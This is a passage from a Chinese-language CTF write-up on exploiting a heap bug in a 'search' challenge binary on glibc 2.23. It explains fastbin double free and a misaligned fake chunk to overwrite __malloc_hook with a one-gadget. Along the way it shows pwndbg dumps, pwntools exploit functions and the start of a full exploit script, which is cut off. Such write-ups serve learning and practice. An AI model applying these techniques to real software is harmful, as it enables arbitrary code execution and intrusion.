+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x349ad010</span><br><span class="line">0x349ad010:     0x0000000000000000      0x0000000000000031	// 旧句子缓冲区,新节点</span><br><span class="line">0x349ad020:     0x00000000349ad100      0x0000000000000040	</span><br><span class="line">0x349ad030:     0x00000000349ad100      0x0000000000000040</span><br><span class="line">0x349ad040:     0x00000000349ad0b0      0x0000000000000031	// 第一个单词节点</span><br><span class="line">0x349ad050:     0x00000000349ad020      0x000000000000000c</span><br><span class="line">0x349ad060:     0x00000000349ad020      0x0000000000000028</span><br><span class="line">0x349ad070:     0x0000000000000000      0x0000000000000031	// 第二个单词节点</span><br><span class="line">0x349ad080:     0x00000000349ad02d      0x0000000000000001</span><br><span class="line">0x349ad090:     0x00000000349ad020      0x0000000000000028</span><br><span class="line">0x349ad0a0:     0x00000000349ad050      0x0000000000000031	// 第三个单词节点</span><br><span class="line">0x349ad0b0:     0x00000000349ad02f      0x0000000000000019</span><br><span class="line">0x349ad0c0:     0x00000000349ad020      0x0000000000000028</span><br><span class="line">0x349ad0d0:     0x00000000349ad080      0x0000000000000021	// 单词缓冲区</span><br><span class="line">0x349ad0e0:     0x0000000000000000      0x0000000061616161</span><br><span class="line">0x349ad0f0:     0x0000000000000000      0x0000000000000051	// 新句子缓冲区</span><br><span class="line">0x349ad100:     0x6464646464646464      0x6464646464646464</span><br><span class="line">0x349ad110:     0x6464646464646464      0x6464646464646464</span><br><span class="line">0x349ad120:     0x6464646464646464      0x6464646464646464</span><br><span class="line">0x349ad130:     0x6464646464646464      0x6464646464646464</span><br></pre></td></tr></table></figure>
+
+<p>新节点的 sentence_ptr 指针字段 0x00000000349ad100，在内存中首字节是 0x00，*sentence_ptr &#x3D;&#x3D; ‘\0’，所以 <code>if</code> 条件整体为假，节点被跳过。而堆区域通过偏移分配地址，也就是说即使有ASRL，所有分配的堆地址低字节都不变。因此需要调整输入句子： <code>aaaa b cccc dddd...</code>，程序分配4个节点，使得 sentence_ptr 指针字段在内存中首字节偏移使其不为 0x00。</p>
+<p>另外一个有意思的点是为什么我要先输入 aaaa ，这是为了让 search(b’\x00’) 可以匹配到。根据上面贴出的调试信息，比如 0x00000000349ad100 这个地址，它的高四字节都是 \x00。因为这里句子缓冲区被用作节点，之前的句子被覆盖，但单词指向的内存不变，所以 aaaa 的节点指向这里地址的低字节，而 b 的节点就会指向高地址的 \x00。</p>
+<h3 id="Fastbin-Double-Free-1"><a href="#Fastbin-Double-Free-1" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>所以现在我们有了 libc 地址，接下来思路就是将 onegadget 或 system 写入 free_hook。</p>
+<p>不过，程序没有提供修改数据的功能，而写入句子的操作只会向新堆块或复用的堆块写入数据，也无法直接修改 free_hook。于是我们需要使用一种称为 Fastbin Double Free 的技术：</p>
+<p>首先回顾一下 Fastbin Double Free，利用 ctf-wiki 的例子说明：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Error in `./search&#x27;: double free or corruption (fasttop): 0x0000000028feb1e0 ***</span><br></pre></td></tr></table></figure>
+
+<p>具体 _int_free 的 double free 检查如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">  <span class="comment">/* 1. 释放分配区 (arena) 的互斥锁 (mutex) */</span></span><br><span class="line">  <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">    __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">  <span class="comment">/* 2. 调用 malloc_printerr 输出错误信息并终止程序 */</span></span><br><span class="line">  malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">  <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当要释放一个 fastbin 大小的堆块 p 时，系统会先找到对应的 fastbin 链表，并用 old 变量记录下当前位于链表头部的第一个空闲块，之后执行一个检查 old &#x3D;&#x3D; p，也就是判断正在释放的堆块 (p) 是否和链表最前面的空闲块 (old) 是同一个；如果 old &#x3D;&#x3D; p 条件成立，意味着用户试图连续两次释放同一个堆块，此时程序就会因 “double free or corruption (fasttop)” 错误而终止。</p>
+<p>我们发现，double free 只检查链表头部第一个空闲块，如果我们释放 chunk1 后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。另外，链表会形成环。以下为示例程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次释放<code>free(chunk1)</code></p>
+<p><img src="/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk1.png" alt="fastbin_free_chunk1"></p>
+<p>第二次释放<code>free(chunk2)</code></p>
+<p><img src="/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk2.png" alt="fastbin_free_chunk2"></p>
+<p>第三次释放<code>free(chunk1)</code></p>
+<p><img src="/images/26-04-19-Fastbin-Double-Free/fastbin_free_chunk3.png" alt="fastbin_free_chunk3"></p>
+<p>以上便是 Double Free 技术，那么这个技术到底实现了什么呢？下面详细探究：</p>
+<p>复用 fastbin 中的空闲块时，glibc 堆管理器会把 main_arena 指向的堆块进行分配，然后将 main_arena 更新为这个堆的 fd 指针。</p>
+<p>当你调用 <code>index</code> 创建一个新句子时，程序会 <code>malloc</code> 一块内存，并把你的输入写入这块内存。如果我们能控制 <code>malloc</code> 返回的地址是 <code>__free_hook</code>，那么我们输入的句子内容就会直接覆盖掉 <code>__free_hook</code> 的值。Fastbin Double Free 的作用，就是欺骗 glibc，让它误以为 libc 数据段上的某个地址是一个空闲的 fastbin 块。逻辑链条是这样的：</p>
+<ol>
+<li><p>Double Free：我们让同一块 40 字节的堆内存被释放两次。这会让 fastbin 链表形成一个环（<code>chunk A -&gt; chunk B -&gt; chunk A -&gt;...</code>）。</p>
+</li>
+<li><p>链表劫持：因为链表里有重复的地址，我们可以通过第一次 <code>malloc</code> 拿到 chunk A，向 chunk A 里写入数据。由于 chunk A 同时也是链表的第三个节点，我们写入的数据就覆盖了 fastbin 链表的 <code>fd</code> 指针。</p>
+</li>
+<li><p>指向任意地址：我们把 <code>fd</code> 指针修改为 <code>__free_hook</code> 附近的地址。这样，glibc 就会认为那个地址是下一个空闲块。</p>
+</li>
+<li><p>分配到目标：第二次 <code>malloc(40)</code> 返回 chunk B。第三次 <code>malloc(40)</code> 返回 chunk A。 第四次 <code>malloc(40)</code>就会返回我们伪造的那个地址（也就是 <code>__free_hook</code> 附近）。</p>
+</li>
+<li><p>hook 劫持：此时输入的句子内容就会直接覆盖掉 <code>__free_hook</code> 的值。</p>
+</li>
+</ol>
+<p>这在下面的函数中实现，并附有部分详细注释。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">double_free</span>():</span><br><span class="line">    <span class="comment"># 索引三个堆(句子)，之后删除它们，让 fastbin 链表形成一个环</span></span><br><span class="line">    index((<span class="string">b&quot;aaaa &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))   <span class="comment"># chunk1</span></span><br><span class="line">    index((<span class="string">b&quot;bbbb c &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>)) <span class="comment"># chunk2</span></span><br><span class="line">    index((<span class="string">b&quot;dddd &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))   <span class="comment"># chunk3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除三个堆，形成一个环</span></span><br><span class="line">    <span class="comment"># 首先删除chunk1，由于chunk1的fd为NULL，此处使用chunk1绕过if条件</span></span><br><span class="line">    <span class="comment"># chunk1不作为fastbin环的成员</span></span><br><span class="line">    search(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按序删除chunk2和chunk3，形成chunk3-&gt;chunk2-&gt;chunk1链路</span></span><br><span class="line">    search(<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk2)</span></span><br><span class="line">    search(<span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk3)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再次删除chunk2，形成chunk2-&gt;chunk3-&gt;chunk2环</span></span><br><span class="line">    search(<span class="string">b&quot;\x00&quot;</span>)    </span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk2)</span></span><br></pre></td></tr></table></figure>
+
+<p>这部分漏洞我花了不少时间才调试出来，这里讲几个我卡住的点，需要注意：</p>
+<ol>
+<li><p><strong>空闲块复用</strong>：</p>
+<p>你可能注意到我的脚本是这样写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index((<span class="string">b&quot;aaaa &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))   <span class="comment"># chunk1</span></span><br><span class="line">index((<span class="string">b&quot;bbbb c &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>)) <span class="comment"># chunk2</span></span><br><span class="line">index((<span class="string">b&quot;dddd &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))   <span class="comment"># chunk3</span></span><br></pre></td></tr></table></figure>
+
+<p>而不是 <code>index(b&quot;a&quot;*0x60)</code>，这是因为在 search 选项里，会申请一个单词大小的堆存储单词，最后释放。如果这里我们的句子大小和单词大小一致，就会导致之前释放的空闲块被复用。这里chunk1是第一个进入 0x60 fastbin 链表的成员，按 <code>index(b&quot;a&quot;*0x60)</code>来写的话，search 选项会复用chunk1再释放，形成的链表就变成了 chunk1-&gt;chunk3-&gt;chunk2，此时再次释放 chunk1 构造环的话明显就会触发 <code>double free or corruption (fasttop)</code>错误。虽然是一个很小的点，不过还是让我花了很长时间。</p>
+<p>当然，这里如果去再次释放 chunk3 也可以形成环，不过这样写对理解 Fastbin Double Free不太友好，我依然按照基本思路编写脚本。</p>
+</li>
+<li><p><strong>if 条件检查</strong>：</p>
+<p>对于正常的 Fastbin Double Free，只需要两个块就可以形成环，但是我这里使用了三个块，这是因为原程序里 if 会去检查堆块用户区首字节是否为0。之前讲到 free 操作会把 fd 写入用户区，导致 if 检查通过，但是 fastbin 中的第一个释放的空闲块必然会指向NULL(chunk3-&gt;chunk2-&gt;chunk1-&gt;0)，这个时候再次通过 search 选项对 chunk1 操作，根本不会通过 if 条件检查，也就根本不会触发 free。这是一个小细节，提醒我们要多熟悉反编译。</p>
+</li>
+</ol>
+<h3 id="字节错位-劫持hook"><a href="#字节错位-劫持hook" class="headerlink" title="字节错位 &amp; 劫持hook"></a>字节错位 &amp; 劫持hook</h3><p>所以我们有了chunk2-&gt;chunk3-&gt;chunk2的环，现在只需要向<code>__malloc_hook</code>写入onegadget 地址。我们的思路是通过修改某个空闲块的 fd 指针使其指向 <code>__malloc_hook</code>，再次复用空闲块时 glibc 就会认为 <code>__malloc_hook</code>地址为某个堆地址，于是我们就可以向其中写入数据。</p>
+<p>这里补充 malloc 复用空闲块的逻辑，简单来说 malloc 会根据申请大小查找 fastbin，如果存在对应空闲块就把 main_arena 存储的值返回，然后把 main_arena 更新为此空闲块的 fd 指针。需要注意这里的先后顺序：在 fd 指针写入到 main_arena 后才会有数据输入到复用的空闲块，我们需要根据这点理解脚本。</p>
+<p>我们此时需要用到经典的<strong>字节错位</strong>技巧，先来看我们遇到了什么问题：</p>
+<p>这里有一个错误的函数实现：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrong_hajack_got</span>(<span class="params">hook, one_gadget</span>):</span><br><span class="line">    fake_fd = hook</span><br><span class="line">    </span><br><span class="line">    index((p64(fake_fd)).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))</span><br><span class="line">    index(<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    index(<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    index((p64(one_gadget)).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这段实现完全按照我们之前说的思路来写，调试观察 fastbin 的行为也完全符合我们的预期。但如果你执行这个脚本，不出意外会遇到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Error in `./search&#x27;: malloc(): memory corruption (fast): 0x00007ac22acd2b20 ***</span><br></pre></td></tr></table></figure>
+
+<p>调试信息：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x23169100 ◂— 0</span><br><span class="line">0x70: 0x7ac22acd2b10 (__malloc_hook) ◂— 0</span><br><span class="line">pwndbg&gt; x/10gx 0x7ac22acd2b10-0x20</span><br><span class="line">0x7ac22acd2af0 &lt;_IO_wide_data_0+304&gt;:   0x00007ac22acd1260      0x0000000000000000</span><br><span class="line">0x7ac22acd2b00 &lt;__memalign_hook&gt;:       0x00007ac22a9b0b00      0x00007ac22a9b0aa0</span><br><span class="line">0x7ac22acd2b10 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ac22acd2b20 &lt;main_arena&gt;:    0x0000000000000000      0x0000000023169100</span><br><span class="line">0x7ac22acd2b30 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>实际上，这是因为 malloc 在复用fastbin空闲块时，会有一个 size 字段的校验，这个 size 字段的检查正是在 <code>_int_malloc</code> 函数内部实现的，它是 <code>malloc</code> 核心分配逻辑的一部分。简单来说，假如 malloc 复用一个0x70的空闲块，它会检查元数据部分 size 字段是否为 0x70，如果不是则证明这不是一个有效的块。很明显 <code>__malloc_hook</code>区域几乎不可能出现完全符合堆块结构的内存。</p>
+<p><strong>字节错位</strong>技巧则完美解决了这个问题。观察上面的调试信息，在<code>__malloc_hook</code>上方存在一些数据，要构成字节错位，我们让地址偏移某个距离，使得size字段(fd+0x8)刚好变成0x70或fastbin接受的其他数值，来通过检查。查看字节存储或许更清晰：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50bx 0x70c22acd2b10-0x20									       落在这里</span><br><span class="line">0x7ac22acd2af0 &lt;_IO_wide_data_0+304&gt;:   0x60    0x12    0xcd    0x2a    0xc2    0x7a    0x00    0x00</span><br><span class="line">0x7ac22acd2af8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x7ac22acd2b00 &lt;__memalign_hook&gt;:       0x00    0x0b    0x9b    0x2a    0xc2    0x7a    0x00    0x00</span><br><span class="line">0x7ac22acd2b08 &lt;__realloc_hook&gt;:        0xa0    0x0a    0x9b    0x2a    0xc2    0x7a    0x00    0x00</span><br><span class="line">0x7ac22acd2b10 &lt;__malloc_hook&gt;: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x7ac22acd2b18: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，高位的 0x70 会存储在高字节，这时我们构造一个偏移让 fd+0x8 落在 &lt;_IO_wide_data_0+304&gt; 这一段的 0x7a 处，于是size字段就是 0x7a（0x70  0x00  0x00  0x00  0x00  0x00  0x00  0x00），这就是字节错位技巧。</p>
+<p>另外，由于ASRL，这里数据的高位在0x70~0x7f之间变化，而标准的 Fastbin 大小只有 <code>0x20</code>, <code>0x30</code>, <code>0x40</code>, <code>0x50</code>, <code>0x60</code>, <code>0x70</code>, <code>0x80</code>。没有 <code>0x7a</code> 或 <code>0x7b</code> 这种大小。</p>
+<p>那 <code>0x7a</code> 为什么能用来欺骗系统呢？这其实涉及到 <em>安全检查的精度</em>的问题：</p>
+<ul>
+<li>分配时的校验逻辑：当 glibc 从 Fastbin 取出一个 chunk 时，它会计算 <code>chunksize()</code>，并通过 <code>fastbin_index()</code> 宏来确定这个大小属于哪个 bin。关键在于，这个索引的计算是<strong>右移 4 位 (即除以 16) 然后减 2</strong> 。</li>
+<li>计算结果是宽泛的区间：无论是 <code>0x78</code>、<code>0x79</code>、<code>0x7a</code>… 一直到 <code>0x7f</code>，右移 4 位后的结果都与 <code>0x70</code> 相同。<ul>
+<li>公式：<code>idx = (sz &gt;&gt; 4) - 2</code></li>
+<li>代入 <code>0x7d</code>：<code>(0x7d &gt;&gt; 4) - 2 = 7 - 2 = 5</code>（对应 <code>0x70</code> 的 bin）</li>
+<li>代入 <code>0x70</code>：<code>(0x70 &gt;&gt; 4) - 2 = 7 - 2 = 5</code></li>
+</ul>
+</li>
+<li>所以，对于负责“验票”的 <code>fastbin_index()</code> 宏来说，<code>0x7a</code> 和 <code>0x70</code> 指向的是同一个入口。因此，即使伪造的 size 是 <code>0x7a</code>，glibc 也会把它当作 <code>0x70</code> 这个 bin 里的合法成员，从而让检查通过。这就是为什么字节错位伪造的 <code>0x7a</code> 能够绕过硬件的 size 校验。</li>
+</ul>
+<p>需要注意，不要使用<code>__malloc_hook</code>地址上方8字节数据去错位，因为 glibc 会认为 fastbin 返回的指针是堆的元数据，之后会向用户区读入数据(+0x10偏移)，如果太靠近<code>__malloc_hook</code>，<code>__malloc_hook</code>会有一部分作为size字段，另一部分作为用户区，会导致 one-gadget 地址被截断。通常来说使用远一点的偏移再通过填充覆写<code>__malloc_hook</code>比较可靠。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hajack_got</span>(<span class="params">hook, one_gadget</span>):</span><br><span class="line">    <span class="comment"># __malloc_hook地址作为伪造的fd指针</span></span><br><span class="line">    fake_fd = hook</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 复用之前的chunk2，并覆写fd指针为__malloc_hook地址</span></span><br><span class="line">    <span class="comment"># 这一步后实际链表结构变成main_arena-&gt;chunk3-&gt;chunk2-&gt;__malloc_hook</span></span><br><span class="line">    <span class="comment"># fd设置偏移35字节，字节错位，绕过size字段检查</span></span><br><span class="line">    index((p64(fake_fd-<span class="number">35</span>)).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再次分配两个chunk，让main_arena指向__malloc_hook</span></span><br><span class="line">    index(<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    index(<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入one_gadget地址到__malloc_hook</span></span><br><span class="line">    <span class="comment"># 注意填充19字节的垃圾数据，覆盖掉__malloc_hook前的padding</span></span><br><span class="line">    index((<span class="string">b&quot;a&quot;</span>*<span class="number">19</span> + p64(one_gadget)).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>需要注意填充19字节而非35字节，因为有16字节作为了元数据。</p>
+<p>此时<code>__malloc_hook</code>已经写入了 one_gadget，再次调用 malloc 就可以触发，不过我们不需要再去索引句子，之后程序分配节点时就会自动触发 malloc。</p>
+<p>另一个小点，malloc(0x60)实际堆块大小是0x70，它会进入0x70的fastbin。我第一次尝试时索引了0x70的句子，这是错误的，它会进入0x80的fastbin，不能通过检查。做堆题还是要明确堆块实际大小和用户区大小、堆头指针和用户区指针的区别。</p>
+<p>以下是完整的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./search&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./search&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">word</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word:&quot;</span>)</span><br><span class="line">    io.sendline(word)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence:&quot;</span>)</span><br><span class="line">    